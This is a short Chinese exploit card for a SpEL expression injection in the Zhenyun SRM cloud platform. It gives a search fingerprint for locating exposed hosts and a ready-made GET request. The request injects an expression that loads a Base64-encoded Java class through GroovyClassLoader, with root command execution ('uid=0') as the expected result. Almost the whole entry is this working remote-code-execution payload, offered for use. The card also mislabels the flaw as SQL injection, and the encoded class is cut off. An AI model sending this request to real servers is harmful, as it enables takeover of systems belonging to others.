# 甄云SRM云平台SpEL表达式注入漏洞

- **系统**：甄云SRM云平台SpEL表达式　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/oauth/static/default/css/footer.css"`
- **请求**：`GET /oauth/public/%5f%5f%24%7bT(groovy.lang.GroovyClassLoader).newInstance().defineClass('CALC',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADQAqwoAJABOCgBPAFAHAFEKAAMAUgoAAwBTCwBUAFUIAD8LAFYAVwcAWAoAWQBaCgBbAFwKAAkAXQgAXgoAXwBgCgAJAGEIAGIKAAkAYwgAZAgAZQgAZggAZwoAaABpCgB`
- **预期**：200　|　uid=0